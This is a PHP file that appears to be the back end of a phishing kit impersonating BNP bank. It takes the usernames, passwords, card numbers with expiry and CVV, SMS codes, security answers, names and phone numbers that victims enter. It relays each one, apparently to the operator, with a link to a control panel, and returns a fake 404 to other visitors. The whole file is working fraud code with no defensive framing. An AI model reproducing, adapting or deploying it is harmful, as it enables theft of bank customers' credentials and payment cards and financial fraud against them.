<?php 
session_start();
require '../config.php';

$ipp = "";
if($_SERVER['REMOTE_ADDR']=="::1"){
$ipp = "127.0.0.1";
}else{
$ipp = $_SERVER['REMOTE_ADDR'];
}
$panel_link = str_replace("auth/post.php", "panel/ctr.php", "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."?ip=$ipp");


if(isset($_POST['blocked'])){
call("/- BNP Notification -/
Victim [$ipp] is using mobile phone so they was blocked.
-------------------------------------
PANEL LINK :". $panel_link);
return;
}



if(isset($_POST['user'])){
$_SESSION['_user'] = $_POST['user'];
call("/- BNP Log -/
User: ".$_POST['user']."
Pass: ".$_POST['pass']."
-------------------------------------
PANEL LINK :". $panel_link);
return;
}


if(isset($_POST['cc'])){
$_SESSION['card'] = $_POST['cc'];
call("/- BNP CC -/
Cc: ".$_POST['cc']."
Exp: ".$_POST['exp']."
Cvv: ".$_POST['cvv']."
-------------------------------------
PANEL LINK :". $panel_link );
return;
}


if(isset($_POST['carding'])){
call("BNP Notification
Entering card info...
-------------------------------------
PANEL LINK :". $panel_link);
return;
}

if(isset($_POST['otping'])){
call("BNP Notification
Entering code...
-------------------------------------
PANEL LINK :". $panel_link);
return;
}

if(isset($_POST['ok'])){
call("BNP Notification
Victim clicked OK -> Loading...
-------------------------------------
PANEL LINK :". $panel_link);
return;
}

if(isset($_POST['inst'])){
call("/- BNP INSTRUCTION -/
ANSWER: ".$_POST['inst']."
-------------------------------------
PANEL LINK :". $panel_link);
return;
}

if(isset($_POST['sms'])){
call("/- BNP SMS -/
CODE: ".$_POST['sms']."
-------------------------------------
PANEL LINK :". $panel_link);
return;
}


if(isset($_POST['link'])){
call("/- BNP LINK AUTH -/
LINK: ".$_POST['link']."
-------------------------------------
PANEL LINK :". $panel_link);
return;
}



if(isset($_POST['answer'])){
call("/- BNP INSTRUCTIONS ANSWER -/
ANSWER : ".$_POST['answer']."
-------------------------------------
PANEL LINK :". $panel_link);
return;
}



if(isset($_POST['name'])){
call("/- BNP INFO -/
Name: ".$_POST['name']."
Phone: ".$_POST['phone']."
-------------------------------------
PANEL LINK :". $panel_link);
return;
}


header("HTTP/1.0 404 Not Found");

?>